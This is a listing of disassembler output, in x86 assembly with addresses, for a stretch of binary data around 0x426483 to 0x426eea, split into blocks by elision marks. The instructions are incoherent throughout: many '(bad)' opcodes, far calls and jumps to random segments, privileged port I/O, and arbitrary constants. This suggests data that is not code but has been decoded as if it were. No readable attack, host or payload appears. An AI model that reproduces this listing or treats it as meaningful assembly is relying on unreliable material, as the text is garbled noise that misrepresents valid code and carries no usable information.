  426483:	or     BYTE PTR ds:0xec7a5307,cl
  426489:	adc    al,0x66
  42648b:	xor    eax,0x5cd5310c
  426490:	add    BYTE PTR gs:[eax],al
	...
  4264f3:	add    BYTE PTR [ecx+0x6f],ch
  4264f6:	mov    BYTE PTR [eax],cl
  4264f8:	mov    gs,edi
  4264fa:	jmp    0x8abb746e
  4264ff:	test   DWORD PTR [ebx],eax
  426501:	mov    cl,0xef
  426503:	cmp    DWORD PTR [eax+0x5000199],esi
  426509:	add    DWORD PTR [eax],eax
  42650b:	add    BYTE PTR [edx],dl
  42650d:	and    eax,DWORD PTR [ebp-0x153338be]
  426513:	sbb    bl,BYTE PTR [ebx-0x6e]
  426516:	call   0x3401:0x5028b90
  42651d:	daa    
  42651e:	push   0xfee0c3a6
  426523:	mov    esp,0x9a7539de
  426528:	and    eax,0xb009d1ce
  42652d:	test   al,0xcb
  42652f:	adc    ecx,DWORD PTR [edx+esi*4-0x17]
  426533:	ss test eax,0x2cf5b445
  426539:	(bad)  
  42653b:	ja     0x426520
  42653d:	jge    0x4265a9
  42653f:	mov    bh,0x2
  426541:	mov    edi,0x954a4330
  426546:	lock push ss
  426548:	fild   WORD PTR [eax-0x7d]
  42654b:	jmp    0xb137aec3
  426550:	sbb    al,0xd
  426552:	sahf   
  426553:	push   ecx
  426554:	adc    esp,DWORD PTR [esi-0x3]
  426557:	adc    DWORD PTR [esi],0x5c
  42655a:	jno    0x426547
  42655c:	call   0xbe29:0x3054c0a
  426563:	lds    ebx,FWORD PTR [ebp+esi*2+0x5b]
  426567:	adc    eax,0xf0d7916d
  42656c:	xor    BYTE PTR [ecx-0x249aa389],dl
  426572:	fnstenv [edi+0x113667a2]
  426578:	jbe    0x42652d
  42657a:	jne    0x426514
  42657c:	aam    0x9b
  42657e:	popf   
  42657f:	push   eax
  426580:	repz js 0x426511
  426583:	popa   
  426584:	mov    ah,0x85
  426586:	sti    
  426587:	in     eax,dx
  426588:	sub    edi,DWORD PTR ds:0x13151817
  42658e:	dec    esi
  42658f:	sbb    BYTE PTR [edi],ch
  426591:	(bad)  
  426592:	xchg   edx,eax
  426593:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426594:	sar    DWORD PTR [ecx],0x3e
  426597:	sub    BYTE PTR [edi],ah
  426599:	sub    eax,0xdf3abab6
  42659e:	or     bl,BYTE PTR [esi*2-0x3fb0d825]
  4265a5:	sub    al,0xd5
  4265a7:	xchg   esi,eax
  4265a8:	xchg   esi,eax
  4265a9:	lahf   
  4265aa:	or     al,0x7c
  4265ac:	inc    ebx
  4265ad:	jmp    0x3f8c:0x21cd86ff
  4265b4:	jmp    0x8f7f:0x39edce10
  4265bb:	aam    0xbd
  4265bd:	fidiv  DWORD PTR [ebx-0x4b]
  4265c0:	sbb    al,0x1a
  4265c2:	push   0xbcd7902
  4265c7:	sbb    eax,0x4d7b0838
  4265cc:	(bad)  
  4265cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265ce:	xchg   ecx,eax
  4265cf:	push   ebp
  4265d0:	cmp    BYTE PTR [esi+edx*1-0x60ec7fac],dl
  4265d7:	and    bl,ah
  4265d9:	pop    ds
  4265da:	dec    edx
  4265db:	outs   dx,DWORD PTR ds:[esi]
  4265dc:	pusha  
  4265dd:	repnz and DWORD PTR [eax+eiz*1-0x19],edi
  4265e2:	adc    ah,ch
  4265e4:	loope  0x42656d
  4265e6:	or     ch,BYTE PTR [edx+0x61e13a86]
  4265ec:	cmp    al,0xf1
  4265ee:	in     eax,0x57
  4265f0:	loopne 0x4265a9
  4265f2:	mov    ebx,0x69ffea98
  4265f7:	pandn  mm4,QWORD PTR [ebx+ecx*2-0x3]
  4265fc:	into   
  4265fd:	pusha  
  4265fe:	je     0x4265eb
  426600:	push   ds
  426601:	retf   0xe1b3
  426604:	xchg   edx,eax
  426605:	pushf  
  426606:	sub    DWORD PTR [eax+eiz*1-0x7b],ebx
  42660a:	int3   
  42660b:	fisubr DWORD PTR [esi]
  42660d:	popf   
  42660e:	and    edi,ebp
  426610:	inc    eax
	...
  426671:	add    BYTE PTR [eax],al
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0xd116da4]
  426682:	loope  0x4266e7
  426684:	mov    ch,0x9a
  426686:	add    DWORD PTR [eax],eax
  426688:	add    eax,0x33000001
  42668d:	je     0x4266c3
  42668f:	push   eax
  426690:	xchg   BYTE PTR es:[eax+0x584fde9a],bh
  426697:	(bad)  
  426699:	inc    edx
  42669a:	sar    al,1
  42669c:	in     al,dx
  42669d:	call   0xfa4e8dbd
  4266a2:	int3   
  4266a3:	enter  0xd0b9,0x2b
  4266a7:	mov    dl,BYTE PTR [ebp-0x6]
  4266aa:	cwde   
  4266ab:	xchg   BYTE PTR [ebp-0x5d],bh
  4266ae:	sbb    dh,BYTE PTR [ecx+eax*1-0x24c9926b]
  4266b5:	je     0x426668
  4266b7:	int    0x29
  4266b9:	inc    edi
  4266ba:	mov    dh,0xd
  4266bc:	pop    es
  4266bd:	sub    edx,edx
  4266bf:	scas   eax,DWORD PTR es:[edi]
  4266c0:	push   ds
  4266c1:	pusha  
  4266c2:	stc    
  4266c3:	sbb    bl,ch
  4266c5:	and    DWORD PTR [edx+0x68337f3],ebp
  4266cb:	adc    esp,DWORD PTR [ebx]
  4266cd:	das    
  4266ce:	add    BYTE PTR [esi],dl
  4266d0:	jg     0x426717
  4266d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266d3:	add    DWORD PTR [ebx],esp
  4266d5:	fucom  st(6)
  4266d7:	lods   eax,DWORD PTR ds:[esi]
  4266d8:	inc    edx
  4266d9:	fsubr  QWORD PTR [edi]
  4266db:	pop    eax
  4266dc:	sub    DWORD PTR [ecx+0x41a7543d],ebp
  4266e2:	es xor al,0x15
  4266e5:	add    BYTE PTR [ebx-0x4734555],bh
  4266eb:	adc    DWORD PTR [esi],ecx
  4266ed:	mov    ebx,0x26f32b27
  4266f2:	loopne 0x426686
  4266f4:	loop   0x426679
  4266f6:	adc    ebx,esp
  4266f8:	cmp    eax,0x969c3bdf
  4266fd:	int    0x41
  4266ff:	call   0xfc94:0xb39c6c3d
  426706:	mov    bl,0x62
  426708:	les    edi,FWORD PTR [ebx-0x37]
  42670b:	or     al,bl
  42670d:	push   cs
  42670e:	sbb    esp,DWORD PTR [ebp-0x59]
  426711:	ret    0x32a0
  426714:	mov    ecx,0x63a78edb
  426719:	xor    al,0xe0
  42671b:	push   ebp
  42671c:	push   cs
  42671d:	adc    ebx,DWORD PTR [eax+0x50]
  426720:	std    
  426721:	clc    
  426722:	mov    bh,BYTE PTR [edi]
  426724:	pop    ds
  426725:	jb     0x4266fe
  426727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426728:	out    dx,eax
  426729:	xlat   BYTE PTR ds:[ebx]
  42672a:	xchg   ebx,eax
  42672b:	frstor [esi]
  42672d:	sbb    edi,esp
  42672f:	sbb    al,0xb2
  426731:	es dec ebp
  426733:	and    BYTE PTR [edi],ah
  426735:	inc    DWORD PTR ds:0xad84852c
  42673c:	sahf   
  42673d:	mov    esp,0xbad79b24
  426742:	(bad)  
  426743:	mov    edi,0x1f30cc02
  426748:	(bad)  
  426749:	jmp    0xc6d3:0x2590c336
  426750:	cdq    
  426751:	push   ebp
  426752:	xchg   esi,eax
  426753:	push   ebx
  426754:	test   al,0x7
  426756:	mov    al,ds:0x7d4c1347
  42675b:	xor    BYTE PTR [ebp+0xa],dl
  42675e:	popa   
  42675f:	and    cl,BYTE PTR ds:0xf5d44591
  426765:	pop    esp
  426766:	and    eax,DWORD PTR [ecx-0x56d8cda5]
  42676c:	aad    0x17
  42676e:	arpl   WORD PTR [ebx-0x7fedce6e],bp
  426774:	ret    
  426775:	cmp    bl,BYTE PTR [edi]
  426777:	cmp    al,0xa5
  426779:	push   0x52
  42677b:	fwait
  42677c:	ret    
  42677d:	adc    DWORD PTR [edx+0x1b],0x14
  426781:	push   esi
  426782:	adc    al,0x49
  426784:	(bad)  
  426785:	fsub   st(2),st
  426787:	mov    cl,0x45
  426789:	rol    esp,1
  42678b:	sub    BYTE PTR [edi-0x72],0xda
  42678f:	(bad)  
  426790:	stos   DWORD PTR es:[edi],eax
	...
  4267f1:	add    BYTE PTR [eax],al
  4267f3:	add    BYTE PTR [eax-0xd53173],bh
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	xor    DWORD PTR [ecx],edi
  426802:	or     al,0xaf
  426804:	mov    edx,0x500019b
  426809:	add    DWORD PTR [eax],eax
  42680b:	add    ah,dh
  42680d:	iret   
  42680e:	mov    BYTE PTR [ebx-0x3ac18da4],0xa9
  426815:	repz xchg ebx,eax
  426817:	test   DWORD PTR [edi-0x5c32c067],edx
  42681d:	xor    BYTE PTR [eax+0x6e],0x2d
  426821:	data16 cli 
  426823:	in     al,dx
  426824:	adc    BYTE PTR [esi+0x77894623],0x48
  42682b:	mov    WORD PTR [esi+eax*2],es
  42682e:	xchg   ebx,eax
  42682f:	int3   
  426830:	cli    
  426831:	or     ebp,DWORD PTR [edx]
  426833:	idiv   BYTE PTR [eax]
  426835:	xor    BYTE PTR [ebx+0x8],cl
  426838:	test   eax,0xc7063ea0
  42683d:	fcomp  QWORD PTR [edx+eiz*1+0x728418a1]
  426844:	test   BYTE PTR [edi+0x6e07ce3b],cl
  42684a:	add    BYTE PTR [edx+0x30],ch
  42684d:	out    dx,eax
  42684e:	dec    edi
  42684f:	push   ebp
  426850:	test   eax,ecx
  426852:	xlat   BYTE PTR ds:[ebx]
  426853:	fld    TBYTE PTR [edx]
  426855:	cli    
  426856:	sar    BYTE PTR [esi+0x64],1
  426859:	(bad)  
  42685a:	xchg   ecx,eax
  42685b:	and    DWORD PTR [ebx+0x3ce81033],edi
  426861:	mov    esi,0x69e30d08
  426866:	push   esi
  426867:	mov    ds:0xa072c5b8,ax
  42686d:	jae    0x42680b
  42686f:	mov    esp,0x23895d26
  426874:	jne    0x426827
  426876:	ret    
  426877:	mov    edx,0x5e5e4a8d
  42687c:	(bad)  
  42687e:	cs adc eax,0xc6e7fed5
  426884:	mov    ds:0xdc744eb7,al
  426889:	or     cl,ah
  42688b:	ins    BYTE PTR es:[edi],dx
  42688c:	jo     0x426858
  42688e:	loope  0x426856
  426890:	mov    eax,ds:0x1c1d0dd6
  426895:	popa   
  426896:	xor    bl,BYTE PTR [ebp+0x65]
  426899:	hlt    
  42689a:	mov    cl,0x3d
  42689c:	ficom  WORD PTR [edi]
  42689e:	in     eax,0x35
  4268a0:	cmp    BYTE PTR [ebx-0x107b40c1],dl
  4268a6:	adc    bl,dh
  4268a8:	push   cs
  4268a9:	adc    DWORD PTR [ebx+ebx*2-0x3d04cc4e],ecx
  4268b0:	stos   BYTE PTR es:[edi],al
  4268b1:	pop    es
  4268b2:	fcomip st,st(2)
  4268b4:	stos   DWORD PTR es:[edi],eax
  4268b5:	lock xchg esi,eax
  4268b7:	addr16 es inc edi
  4268ba:	mov    bh,0xca
  4268bc:	test   al,ch
  4268be:	mov    ebp,0x563d3df9
  4268c3:	(bad)  
  4268c5:	out    0x4f,eax
  4268c7:	dec    ebp
  4268c8:	adc    eax,0x880ef6f4
  4268cd:	or     eax,0xaee14557
  4268d2:	jmp    0x3b6bbd66
  4268d7:	and    cl,BYTE PTR [ecx]
  4268d9:	ror    DWORD PTR [edx],cl
  4268db:	add    eax,0x66d1dd34
  4268e0:	xor    bl,BYTE PTR ds:0x2a2f3c93
  4268e6:	xor    eax,0xc4b3a1af
  4268eb:	jae    0x42693c
  4268ed:	jmp    edi
  4268ef:	dec    esp
  4268f0:	adc    al,0x47
  4268f2:	out    0xa0,al
  4268f4:	push   edi
  4268f5:	mov    bh,0xd
  4268f7:	bound  esi,QWORD PTR es:[edx]
  4268fa:	push   cs
  4268fb:	stos   DWORD PTR es:[edi],eax
  4268fc:	ss in  eax,0x71
  4268ff:	lods   al,BYTE PTR ds:[esi]
  426900:	in     eax,dx
  426901:	out    0x34,eax
  426903:	test   DWORD PTR [esi],esp
  426905:	(bad)  
  426906:	nop
  426907:	mov    bl,0x5e
  426909:	lods   eax,DWORD PTR ds:[esi]
  42690a:	aas    
  42690b:	jae    0x426927
  42690d:	pop    es
  42690e:	mov    ch,0xff
  426910:	fld    DWORD PTR [eax]
	...
  426972:	add    BYTE PTR [eax],al
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    ebp,DWORD PTR [esi-0x4016d5ba]
  426985:	pushf  
  426986:	add    DWORD PTR [eax],eax
  426988:	add    eax,0xce000001
  42698d:	cld    
  42698e:	mov    eax,DWORD PTR [edi]
  426990:	retf   
  426991:	dec    esi
  426992:	outs   dx,DWORD PTR ds:[esi]
  426993:	bound  ebp,QWORD PTR ds:0x368ec3e6
  426999:	std    
  42699a:	es add eax,esi
  42699d:	std    
  42699e:	sub    ch,BYTE PTR [ebx]
  4269a0:	rol    BYTE PTR [ebp-0x79],cl
  4269a3:	pop    edi
  4269a4:	lods   al,BYTE PTR ds:[esi]
  4269a5:	add    BYTE PTR [ecx],al
  4269a7:	jle    0x42696b
  4269a9:	mov    eax,ds:0xbfc94edd
  4269ae:	pop    eax
  4269af:	mov    edi,0xa30014e
  4269b4:	jge    0x4269a6
  4269b6:	mov    ch,0xb9
  4269b8:	mov    dh,0x8e
  4269ba:	xchg   edi,eax
  4269bb:	ficom  DWORD PTR [edx-0x74d202aa]
  4269c1:	(bad)  
  4269c2:	mov    DWORD PTR [ecx+0x12],ebp
  4269c5:	sub    eax,0xde9f6bfa
  4269ca:	and    al,0x40
  4269cc:	retf   
  4269cd:	pop    ebp
  4269ce:	xchg   ebp,eax
  4269cf:	sahf   
  4269d0:	test   dh,0x9d
  4269d3:	(bad)  
  4269d4:	iret   
  4269d5:	xor    eax,0x6677d4a8
  4269da:	mov    ds:0x4eadca67,al
  4269df:	daa    
  4269e0:	mov    DWORD PTR [esi+0x49],ebx
  4269e3:	stos   BYTE PTR es:[edi],al
  4269e4:	pop    ss
  4269e5:	ja     0x4269bf
  4269e7:	jns    0x4269ed
  4269e9:	dec    eax
  4269ea:	push   ss
  4269eb:	scas   eax,DWORD PTR es:[edi]
  4269ec:	push   ds
  4269ed:	test   ah,bl
  4269ef:	xchg   edx,eax
  4269f0:	daa    
  4269f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269f2:	ins    BYTE PTR es:[edi],dx
  4269f3:	shr    bl,cl
  4269f5:	rcr    DWORD PTR [esi-0xa],cl
  4269f8:	or     BYTE PTR [ebx],bl
  4269fa:	xchg   BYTE PTR [edi],ch
  4269fc:	mov    edx,0x5583bafd
  426a01:	inc    ebx
  426a02:	into   
  426a03:	or     DWORD PTR [edx],ebx
  426a05:	pop    es
  426a06:	pop    ebp
  426a07:	mov    al,ds:0xfd4815b5
  426a0c:	mov    fs,WORD PTR [ebx]
  426a0e:	gs cmp al,0xe8
  426a11:	pop    ss
  426a12:	gs out 0x29,eax
  426a15:	push   esi
  426a16:	xchg   edx,eax
  426a17:	pop    ds
  426a18:	jae    0x4269b6
  426a1a:	pushf  
  426a1b:	outs   dx,DWORD PTR ds:[esi]
  426a1c:	sbb    al,0xa1
  426a1e:	mov    edx,0x1a60827
  426a23:	nop
  426a24:	adc    eax,DWORD PTR [ecx-0x4a85b087]
  426a2a:	or     edx,DWORD PTR [esi+0x7f31d27e]
  426a30:	test   al,0xfa
  426a32:	jb     0x4269e9
  426a34:	cmp    ch,BYTE PTR [ecx+0xd]
  426a37:	ja     0x426a20
  426a39:	dec    ebx
  426a3a:	sub    ecx,ecx
  426a3c:	leave  
  426a3d:	jb     0x4269ee
  426a3f:	hlt    
  426a40:	and    al,0x8f
  426a42:	inc    dl
  426a44:	test   BYTE PTR [ebx-0x58],bh
  426a47:	stos   BYTE PTR es:[edi],al
  426a48:	adc    ah,BYTE PTR [eax+0x1ce9b7a7]
  426a4e:	(bad)  
  426a50:	bnd jns 0x4269ef
  426a53:	xlat   BYTE PTR ds:[ebx]
  426a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a55:	mov    ds:0x4e86d2c9,al
  426a5a:	mov    ch,0xa3
  426a5c:	aam    0xe9
  426a5e:	js     0x426a26
  426a60:	push   0x8e3551d8
  426a65:	mov    edx,0x59a980e7
  426a6a:	gs mov dh,0x7b
  426a6d:	pop    ecx
  426a6e:	cmp    al,0xfa
  426a70:	shr    bl,cl
  426a72:	les    sp,DWORD PTR [ebx]
  426a75:	xor    edi,0xffffffb4
  426a78:	ret    
  426a79:	pop    ebx
  426a7a:	xor    edx,DWORD PTR ds:0xeea0036d
  426a80:	cmp    DWORD PTR [eax-0x26ecedf],edx
  426a86:	enter  0xf036,0xb2
  426a8a:	or     al,0x6
  426a8c:	xchg   ebx,eax
  426a8d:	cmp    ecx,eax
  426a8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a90:	mov    bl,0x0
	...
  426af2:	add    BYTE PTR [eax],al
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0xb1
  426b01:	lds    edi,FWORD PTR [ebx]
  426b03:	sub    eax,esp
  426b05:	popf   
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    eax,0x54000001
  426b0d:	mov    ss,WORD PTR [esi-0x22]
  426b10:	pop    edx
  426b11:	into   
  426b12:	and    al,0x8b
  426b14:	inc    eax
  426b15:	pushf  
  426b16:	in     al,dx
  426b17:	repz push edi
  426b19:	jmp    0x2d08:0xfa5e4395
  426b20:	mov    bl,0xd8
  426b22:	stos   BYTE PTR es:[edi],al
  426b23:	ret    0x2c68
  426b26:	fmul   DWORD PTR [esi-0x5a]
  426b29:	mov    ah,0x94
  426b2b:	and    al,dl
  426b2d:	in     al,0x55
  426b2f:	mov    ds:0xb0f2e3b3,al
  426b34:	push   esi
  426b35:	dec    esp
  426b36:	adc    eax,0xb1f9aef2
  426b3b:	cmp    ah,BYTE PTR [eax]
  426b3d:	cmovns ebx,DWORD PTR [esi+0x6bf0014e]
  426b44:	mov    edx,DWORD PTR [ebp-0x6a983d85]
  426b4a:	jp     0x426ba6
  426b4c:	xor    ah,bl
  426b4e:	or     bh,BYTE PTR [esi-0x53e86b18]
  426b54:	adc    BYTE PTR [esi+0x4a],al
  426b57:	jbe    0x426b8e
  426b59:	mov    esi,0x90de8729
  426b5e:	inc    esi
  426b5f:	int3   
  426b60:	xor    eax,0xa86b3055
  426b65:	daa    
  426b66:	ror    BYTE PTR [edx+0x61],cl
  426b69:	(bad)  
  426b6a:	out    dx,eax
  426b6b:	retf   0x1265
  426b6e:	(bad)  
  426b6f:	sbb    BYTE PTR [esi+0x4f],bl
  426b72:	xchg   ecx,eax
  426b73:	cmc    
  426b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b75:	or     cl,BYTE PTR [ebp-0x4b]
  426b78:	mov    ch,0x30
  426b7a:	pop    edi
  426b7b:	mov    dh,0xe9
  426b7d:	and    al,0xa9
  426b7f:	sbb    BYTE PTR [esi+0x59c686ed],dl
  426b85:	sbb    BYTE PTR [ebx+0x62cbedf6],dh
  426b8b:	icebp  
  426b8c:	mov    dh,0x53
  426b8e:	add    ch,BYTE PTR [ecx+0x58c32530]
  426b94:	add    BYTE PTR [ebp-0x1fd25962],dh
  426b9a:	pushf  
  426b9b:	clc    
  426b9c:	jmp    edi
  426b9e:	push   ecx
  426b9f:	push   ss
  426ba0:	pop    esi
  426ba1:	fsubr  QWORD PTR [edi-0x6]
  426ba4:	cwde   
  426ba5:	std    
  426ba6:	sub    BYTE PTR [edx],0x73
  426ba9:	or     DWORD PTR gs:[eax+ebp*2+0xa85f269],ebp
  426bb1:	inc    esp
  426bb2:	sar    BYTE PTR [edx+0x5c631bce],0xec
  426bb9:	mov    DWORD PTR [edx+0x66ce4826],edi
  426bbf:	pushf  
  426bc0:	jae    0x426bbe
  426bc2:	xor    al,0x79
  426bc4:	mov    cl,0x77
  426bc6:	sub    DWORD PTR [esi+0x6da3e6cd],eax
  426bcc:	mov    ecx,0x23c8686d
  426bd1:	pop    ss
  426bd2:	sub    al,BYTE PTR [edx+ebp*4]
  426bd5:	mov    esi,0x4485f460
  426bda:	jbe    0x426ba7
  426bdc:	push   es
  426bdd:	ja     0x426c0d
  426bdf:	in     eax,0x6
  426be1:	mov    edx,0x1719051a
  426be6:	cmp    DWORD PTR [eax+0x7a],esp
  426be9:	ds ret 0x291
  426bed:	repz pop ebx
  426bef:	cmp    al,0xa2
  426bf1:	dec    esi
  426bf2:	mov    bh,0xad
  426bf4:	xchg   ebp,eax
  426bf5:	jns    0x426c00
  426bf7:	cli    
  426bf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bf9:	cmc    
  426bfa:	mov    cl,0x89
  426bfc:	imul   ebp,DWORD PTR cs:[ecx-0x5370cef6],0xffffffe7
  426c04:	xchg   esi,eax
  426c05:	in     al,dx
  426c06:	mov    dh,0xf2
  426c08:	ds xor eax,0xe45c94f
  426c0e:	cmp    DWORD PTR [edi-0x2d],ecx
	...
  426c71:	add    BYTE PTR [eax],al
  426c73:	add    dl,ah
  426c75:	pusha  
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x3ff647b1
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0xf4000001
  426c8d:	mov    edx,0x67b1885e
  426c92:	pause  
  426c94:	xor    cl,dl
  426c96:	lods   eax,DWORD PTR ds:[esi]
  426c97:	adc    ch,BYTE PTR [ebx-0x8]
  426c9a:	adc    DWORD PTR [ebx+edx*2],0xc9375265
  426ca1:	cmp    eax,0xdfeceec2
  426ca6:	or     ah,BYTE PTR [esi+edi*4+0x102190cb]
  426cad:	enter  0x38d7,0xe3
  426cb1:	imul   esi,DWORD PTR [esp+ebx*2+0x9],0x42
  426cb6:	and    BYTE PTR [esi],0x67
  426cb9:	lock pushf 
  426cbb:	pop    esi
  426cbc:	adc    dl,ch
  426cbe:	jo     0x426d14
  426cc0:	shr    BYTE PTR [ebp+0x79],0x7d
  426cc4:	xchg   esp,ebx
  426cc6:	xor    edx,DWORD PTR [edi+0x8af4894]
  426ccc:	lea    edx,[ecx]
  426cce:	mov    al,ds:0x1db0ddd9
  426cd3:	add    BYTE PTR [esi-0x8],cl
  426cd6:	rcl    DWORD PTR ds:0x28b62dc9,0x7f
  426cdd:	ins    BYTE PTR es:[edi],dx
  426cde:	cwde   
  426cdf:	imul   ebx,ebx,0xe8fb06b8
  426ce5:	outs   dx,DWORD PTR ds:[esi]
  426ce6:	cmp    al,0x37
  426ce8:	add    eax,0xd2754f9e
  426ced:	nop
  426cee:	mov    ebp,0x535cd6b
  426cf3:	sbb    BYTE PTR [edx],cl
  426cf5:	lods   eax,DWORD PTR ds:[esi]
  426cf6:	jmp    0x8727:0x11ef92f6
  426cfd:	sub    DWORD PTR [edi+0xf],esi
  426d00:	test   eax,0x84ec743b
  426d05:	push   eax
  426d06:	xchg   ebp,eax
  426d07:	add    al,0x67
  426d09:	(bad)  
  426d0a:	xor    eax,0x27318b48
  426d0f:	js     0x426cd4
  426d11:	call   0x6851:0x2891be33
  426d18:	out    0xaa,eax
  426d1a:	cli    
  426d1b:	mov    al,0x3c
  426d1d:	push   ecx
  426d1e:	inc    edi
  426d1f:	add    DWORD PTR [eax+0x76b9dcdc],ecx
  426d25:	das    
  426d26:	out    0xdf,al
  426d28:	mov    ecx,0x9a1576ab
  426d2d:	sbb    DWORD PTR [eax-0x7f3fddd7],esi
  426d33:	xchg   edx,eax
  426d34:	xor    eax,0x221f3461
  426d39:	pxor   mm7,QWORD PTR [esi+0x213fb9ca]
  426d40:	dec    esp
  426d41:	dec    ebx
  426d42:	lods   eax,DWORD PTR ds:[esi]
  426d43:	or     ah,bh
  426d45:	or     DWORD PTR [edi],ecx
  426d47:	jl     0x426d94
  426d49:	xchg   edx,eax
  426d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d4b:	xchg   esi,eax
  426d4c:	mov    WORD PTR [edi],?
  426d4e:	sub    esp,DWORD PTR [ebp+0x4fa6f9]
  426d54:	scas   eax,DWORD PTR es:[edi]
  426d55:	xchg   esp,eax
  426d56:	pop    ebp
  426d57:	aad    0x65
  426d59:	jnp    0x426d92
  426d5b:	fadd   DWORD PTR [edx+0x4d]
  426d5e:	jl     0x426dd4
  426d60:	xor    al,0x6a
  426d62:	std    
  426d63:	in     al,0x8d
  426d65:	inc    ebp
  426d66:	popa   
  426d67:	call   0xef4a11a2
  426d6c:	mov    ah,0xe2
  426d6e:	into   
  426d6f:	ins    BYTE PTR es:[edi],dx
  426d70:	add    bl,BYTE PTR [edx-0x1d]
  426d73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d74:	mov    al,0x8b
  426d76:	fcomp  QWORD PTR [ebp+0xc30266d]
  426d7c:	dec    eax
  426d7d:	gs pushf 
  426d7f:	sbb    al,0x95
  426d81:	pop    eax
  426d82:	xchg   DWORD PTR ds:0x328fba0c,edi
  426d88:	dec    ecx
  426d89:	jo     0x426df7
  426d8b:	pushf  
  426d8c:	fldcw  WORD PTR ds:0x51cec5
	...
  426df2:	add    BYTE PTR [eax],al
  426df4:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426dfa:	call   0x2a0c:0xc7c2ecf9
  426e01:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  426e03:	or     eax,0x19fce
  426e08:	add    eax,0x2b000001
  426e0d:	xchg   edx,eax
  426e0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e0f:	(bad)  
  426e10:	ins    DWORD PTR es:[edi],dx
  426e11:	into   
  426e12:	mov    ebp,0x4ad1bb9
  426e17:	jp     0x426e4d
  426e19:	pushf  
  426e1a:	add    ebp,DWORD PTR [ebx]
  426e1c:	gs jo  0x426e2d
  426e1f:	(bad)  
  426e20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e21:	outs   dx,BYTE PTR ds:[esi]
  426e22:	inc    eax
  426e23:	and    DWORD PTR [ebp-0x700fdbd9],edi
  426e29:	hlt    
  426e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e2b:	stos   BYTE PTR es:[edi],al
  426e2c:	ins    BYTE PTR es:[edi],dx
  426e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e2e:	stc    
  426e2f:	push   ss
  426e30:	fcomi  st,st(3)
  426e32:	shr    DWORD PTR [ebx-0xd],0x66
  426e36:	mov    ecx,0xa1c0157f
  426e3b:	out    dx,al
  426e3c:	daa    
  426e3d:	sbb    al,0xbd
  426e3f:	call   0x8ae7:0xa28ae9cb
  426e46:	xchg   BYTE PTR [edx+ebx*2+0x6b50fe39],ah
  426e4d:	push   0x3a9b92e
  426e52:	pop    ds
  426e53:	rol    bl,1
  426e55:	test   DWORD PTR ss:[esi+0x2e6e38a0],0x592fc2b5
  426e60:	jmp    0x77f:0x8276ec0c
  426e67:	(bad)  
  426e68:	retf   
  426e69:	adc    ah,dh
  426e6b:	or     ecx,DWORD PTR [edx+0x6b7e0a6e]
  426e71:	add    bh,0x11
  426e74:	rcr    BYTE PTR [ebp+0x29],1
  426e77:	bound  ebx,QWORD PTR [edx-0xe1a9b92]
  426e7d:	jl     0x426e5a
  426e7f:	xchg   edi,eax
  426e80:	aam    0x98
  426e82:	gs jle 0x426ea9
  426e85:	scas   eax,DWORD PTR es:[edi]
  426e86:	clc    
  426e87:	(bad)  
  426e88:	xchg   edi,eax
  426e89:	pop    esp
  426e8b:	sbb    DWORD PTR [eax-0x2eeb762e],ebp
  426e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e92:	test   eax,0x3aea26cc
  426e97:	jmp    0x426e6c
  426e99:	mov    DWORD PTR [ecx],edi
  426e9b:	jg     0x426eb6
  426e9d:	fdivr  st,st(5)
  426e9f:	xchg   ecx,eax
  426ea0:	jmp    esp
  426ea2:	mov    ch,0x74
  426ea4:	push   ss
  426ea5:	pop    ebp
  426ea6:	aas    
  426ea7:	outs   dx,BYTE PTR ds:[esi]
  426ea8:	std    
  426ea9:	sahf   
  426eaa:	and    cl,bh
  426eac:	mov    edi,0xe9ebe90d
  426eb1:	fist   WORD PTR [esi+ebx*4+0x4320d420]
  426eb8:	dec    edi
  426eb9:	push   eax
  426eba:	out    0xc9,eax
  426ebc:	out    0x45,eax
  426ebe:	in     al,0x4d
  426ec0:	data16 or dl,BYTE PTR [eax+0x65c51b7d]
  426ec7:	gs stos DWORD PTR es:[edi],eax
  426ec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426eca:	xchg   esp,eax
  426ecb:	mov    cl,0x36
  426ecd:	or     ah,BYTE PTR [eax+eax*2+0x374b4468]
  426ed4:	add    eax,0xa65d7a0c
  426ed9:	xchg   DWORD PTR [eax+0x7d9447f5],edi
  426edf:	push   ebp
  426ee0:	xor    eax,0xa35e34ef
  426ee5:	sbb    eax,0x9c1daef3
  426eea:	mov    al,BYTE PTR [edi+ecx*4-0x40]
